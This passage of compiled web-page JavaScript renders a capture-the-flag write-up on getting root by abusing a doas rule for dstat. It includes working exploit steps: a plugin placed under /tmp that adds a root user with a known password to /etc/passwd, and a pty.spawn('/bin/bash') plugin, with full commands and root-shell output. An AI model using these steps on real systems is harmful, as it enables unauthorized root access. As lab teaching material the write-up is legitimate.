variable"}},[a("span",{pre:!0,attrs:{class:"token environment constant"}},[t._v("HOME")])]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v("/tmp/home "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("}")]),t._v(" servsau as root cmd /usr/bin/dstat\n")])])]),a("p",[t._v("From the config we get that "),a("code",[t._v("servsau")]),t._v(" user can run "),a("code",[t._v("/usr/bin/dstat")]),t._v(" as root.")]),t._v(" "),a("p",[t._v("From the man page of "),a("a",{attrs:{href:"https://man7.org/linux/man-pages/man1/pcp-dstat.1.html",target:"_blank",rel:"noopener noreferrer"}},[t._v("dstat"),a("OutboundLink")],1),t._v(" , We can see that its just a simple binary to display the stat of the machine. But we can use customized plugins written in python and use it (we can use this feature to exploit this).")]),t._v(" "),a("p",[t._v("But to run the plugins in "),a("code",[t._v("dstat")]),t._v(" we have to place the python files in")]),t._v(" "),a("div",{staticClass:"language-bash extra-class"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[t._v("~/.dstat/\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("path of binary"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("/plugins/\n/usr/share/dstat/\n/usr/local/share/dstat/\n")])])]),a("p",[t._v("except the user home directory non of the locations are writeable so we cannot add our custom plugin in those locations.")]),t._v(" "),a("p",[t._v("But out user servsau doesn't have home directory")]),t._v(" "),a("div",{staticClass:"language-bash extra-class"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[t._v("$ "),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("cat")]),t._v(" /etc/passwd "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("grep")]),t._v(" servsau\nservsau:x:1003:1003:::/bin/bash\n")])])]),a("p",[t._v("If we see the config file of doas again it set "),a("code",[t._v("HOME")]),t._v(" to "),a("code",[t._v("/tmp/home/")]),t._v(". As /tmp is writable to all users we can create "),a("code",[t._v("home/.dstat")]),t._v(" there and put our payload there.")]),t._v(" "),a("p",[t._v("But there is a cron job that will delete "),a("code",[t._v("home")]),t._v(" from /tmp every 30 seconds so we have to be quick on this.")]),t._v(" "),a("p",[t._v("Now that we have everything lets see the skeleton code of plugin of dstat.\nHere is the "),a("code",[t._v("helloworld")]),t._v(" plugin of dstat.")]),t._v(" "),a("div",{staticClass:"language-py extra-class"},[a("pre",{pre:!0,attrs:{class:"language-py"}},[a("code",[t._v("$ cat "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("usr"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("share"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("dstat"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("dstat_helloworld"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("py\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[t._v("### Author: Dag Wieers <dag$wieers,com>")]),t._v("\n\n"),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("class")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token class-name"}},[t._v("dstat_plugin")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("dstat"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v("\n    "),a("span",{pre:!0,attrs:{class:"token triple-quoted-string string"}},[t._v('"""\n    Example "Hello world!" output plugin for aspiring Dstat developers.\n    """')]),t._v("\n\n    "),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("def")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("__init__")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("self"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v("\n        self"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("name "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[t._v("'plugin title'")]),t._v("\n        self"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("nick "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token string"}},[t._v("'counter'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n        self"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),a("span",{pre:!0,attrs:{class:"token builtin"}},[t._v("vars")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token string"}},[t._v("'text'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n        self"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),a("span",{pre:!0,attrs:{class:"token builtin"}},[t._v("type")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[t._v("'s'")]),t._v("\n        self"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("width "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("12")]),t._v("\n        self"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("scale "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("0")]),t._v("\n\n    "),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("def")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("extract")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("self"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v("\n        self"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("val"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),a("span",{pre:!0,attrs:{class:"token string"}},[t._v("'text'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[t._v("'Hello world!'")]),t._v("\n\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[t._v("# vim:ts=4:sw=4:et")]),t._v("\n")])])]),a("h3",{attrs:{id:"how-i-approached"}},[t._v("How I approached")]),t._v(" "),a("p",[t._v("I just overcomplicated the thing while solving for the first time but learnt 1 important thing so I wanted to share how I approaced this at first. Then later on I will show how you can do this easily as well.")]),t._v(" "),a("p",[t._v("In "),a("code",[t._v("dstat")]),t._v(" we can write the output of the program by using "),a("code",[t._v("-output")]),t._v(" flag. So we can write anything as root. So I thought of writing my ssh key to "),a("code",[t._v("/root/.ssh/authorized_keys")]),t._v(" and tried but it doesn't work as there was no "),a("code",[t._v(".ssh")]),t._v(" folder in "),a("code",[t._v("/root/")]),t._v(" directory.")]),t._v(" "),a("p",[t._v("Next I think of writing to "),a("code",[t._v("/etc/sudoers")]),t._v(" and give myself root permision but this also doesnt work. Because the output of the "),a("code",[t._v("dstat")]),t._v(" has something like this in header and these lines broke the "),a("code",[t._v("/etc/sudoers")])]),t._v(" "),a("div",{staticClass:"language- extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[t._v('"Dstat 0.7.2 CSV output"\n"Author:","Dag Wieers <dag@wieers.com>",,,,"URL:","http://dag.wieers.com/home-made/dstat/"\n"Host:","servsau",,,,"User:","servsau"\n"Cmdline:","dstat --output test",,,,"Date:","08 Feb 2022 05:03:16 UTC"\n')])])]),a("p",[t._v("I was so frustrated at this moment and started tried to write every locations in linux filesystem which will upgrade my permissions. And it turned out those junks from the output of dstat won't break the "),a("code",[t._v("/etc/passwd")]),t._v(". So we can make new users with root permissions without any issues.")]),t._v(" "),a("p",[t._v("Here is what I did to create new user.")]),t._v(" "),a("div",{staticClass:"language-bash extra-class"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[t._v("$ openssl "),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("passwd")]),t._v(" password\nICs0rmhf9Wuqw\n")])])]),a("p",[t._v("Created a password for new user and edited the helloworld plugin like this.")]),t._v(" "),a("div",{staticClass:"language-py extra-class"},[a("pre",{pre:!0,attrs:{class:"language-py"}},[a("code",[a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("class")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token class-name"}},[t._v("dstat_plugin")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("dstat"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v("\n    "),a("span",{pre:!0,attrs:{class:"token triple-quoted-string string"}},[t._v('"""\n    Example "Hello world!" output plugin for aspiring Dstat developers.\n    """')]),t._v("\n\n    "),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("def")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("__init__")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("self"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v("\n        self"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("name "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[t._v("'plugin title'")]),t._v("\n        self"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("nick "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token string"}},[t._v("'counter'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n        self"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),a("span",{pre:!0,attrs:{class:"token builtin"}},[t._v("vars")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token string"}},[t._v("'text'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n        self"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),a("span",{pre:!0,attrs:{class:"token builtin"}},[t._v("type")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[t._v("'s'")]),t._v("\n        self"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("width "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("12")]),t._v("\n        self"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("scale "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("0")]),t._v("\n\n    "),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("def")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("extract")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("self"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v("\n        self"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("val"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),a("span",{pre:!0,attrs:{class:"token string"}},[t._v("'text'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[t._v("'newroot:ICs0rmhf9Wuqw:0:0:root:/root:/bin/bash'")]),t._v("\n\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[t._v("# vim:ts=4:sw=4:et")]),t._v("\n")])])]),a("p",[t._v("Now it will write "),a("code",[t._v("newroot:ICs0rmhf9Wuqw:0:0:root:/root:/bin/bash")]),t._v(" to "),a("code",[t._v("/etc/passwd")]),t._v("  and create new user name "),a("code",[t._v("newroot")]),t._v(" with password "),a("code",[t._v("password")])]),t._v(" "),a("p",[t._v("I saved the file as "),a("code",[t._v("dstat_exploit.py")]),t._v(" in "),a("code",[t._v("/tmp")]),t._v(" and used the following command")]),t._v(" "),a("div",{staticClass:"language-bash extra-class"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[t._v("$ "),a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[t._v("cd")]),t._v(" /tmp "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("&&")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("mkdir")]),t._v(" home "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("&&")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("mkdir")]),t._v(" home/.dstat "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("&&")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("cp")]),t._v(" dstat_exploit.py home/.dstat/ "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("&&")]),t._v(" doas /usr/bin/dstat --exploit --output /etc/passwd\n\nplugin-title\n  counter   \nnewroot:ICs0rmhf9Wuqw:0:0:root:/root:/bin/bash\n")])])]),a("p",[t._v("After that I closed the program and checked "),a("code",[t._v("/etc/passwd")])]),t._v(" "),a("div",{staticClass:"language-bash extra-class"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[t._v("$ "),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("cat")]),t._v(" /etc/passwd                        \nroot:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin\ngnats:x:41:41:Gnats Bug-Reporting System "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("admin"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(":/var/lib/gnats:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\nsystemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false\nsystemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false\nsystemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false\nsystemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false\nsyslog:x:104:108::/home/syslog:/bin/false\n_apt:x:105:65534::/nonexistent:/bin/false\nlxd:x:106:65534::/var/lib/lxd/:/bin/false\nmessagebus:x:107:111::/var/run/dbus:/bin/false\nuuidd:x:108:112::/run/uuidd:/bin/false\ndnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/bin/false\nsshd:x:110:65534::/var/run/sshd:/usr/sbin/nologin\npollinate:x:111:1::/var/cache/pollinate:/bin/false\npetrio:x:1001:1001::/home/petrio:\nmantaboy:x:1002:1002::/home/mantaboy:\nservsau:x:1003:1003:::/bin/bash\nbaeker:x:1004:1004::/home/baeker:\nbekcha:x:1005:1005::/home/bekcha:\ntelnetd:x:112:118::/nonexistent:/bin/false\n\n\n"),a("span",{pre:!0,attrs:{class:"token string"}},[t._v('"Host:"')]),t._v(","),a("span",{pre:!0,attrs:{class:"token string"}},[t._v('"servsau"')]),t._v(",,,,"),a("span",{pre:!0,attrs:{class:"token string"}},[t._v('"User:"')]),t._v(","),a("span",{pre:!0,attrs:{class:"token string"}},[t._v('"root"')]),t._v("\n"),a("span",{pre:!0,attrs:{class:"token string"}},[t._v('"Cmdline:"')]),t._v(","),a("span",{pre:!0,attrs:{class:"token string"}},[t._v('"dstat --exploit --output /etc/passwd"')]),t._v(",,,,"),a("span",{pre:!0,attrs:{class:"token string"}},[t._v('"Date:"')]),t._v(","),a("span",{pre:!0,attrs:{class:"token string"}},[t._v('"08 Feb 2022 05:11:57 UTC"')]),t._v("\n\n"),a("span",{pre:!0,attrs:{class:"token string"}},[t._v('"plugin title"')]),t._v("\n"),a("span",{pre:!0,attrs:{class:"token string"}},[t._v('"counter"')]),t._v("\nnewroot:ICs0rmhf9Wuqw:0:0:root:/root:/bin/bash\n")])])]),a("p",[t._v("As you can see at the last line new user was created now we just have to do su newroot and get root.")]),t._v(" "),a("div",{staticClass:"language-bash extra-class"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[t._v("$ "),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("su")]),t._v(" newroot\nPassword: password\nroot@servsau:/tmp"),a("span",{pre:!0,attrs:{class:"token comment"}},[t._v("# ")]),t._v("\n")])])]),a("h3",{attrs:{id:"easy-way"}},[t._v("Easy way")]),t._v(" "),a("p",[t._v("I approached the box as mentioned above but later on realized that there is easy way to solve the box. Insted of creating the plugin and thinking of storing the output you can create a "),a("code",[t._v("dstat_exploit.py")]),t._v(" in "),a("code",[t._v("/tmp/")]),t._v(" with following content")]),t._v(" "),a("div",{staticClass:"language-py extra-class"},[a("pre",{pre:!0,attrs:{class:"language-py"}},[a("code",[a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("import")]),t._v(" pty\npty"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("spawn"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token string"}},[t._v("'/bin/bash'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n")])])]),a("p",[t._v("And then run the same command that I used before.")]),t._v(" "),a("div",{staticClass:"language- extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[t._v("servsau@servsau:/tmp$ cd /tmp && mkdir home && mkdir home/.dstat && cp dstat_ok.py home/.dstat/ && doas /usr/bin/dstat --ok\nroot@servsau:/tmp# \n")])])]),a("p",[t._v("And that's everything for this writeup. Hope you have learnt something from this . If you have any doubts you can send me a message at my "),a("a",{attrs:{href:"https://twitter.com/0x4vian",target:"_blank",rel:"noopener noreferrer"}},[t._v("twitter handler"),a("OutboundLink")],1)])])}),[],!1,null,null,null);s.default=e.exports}}]);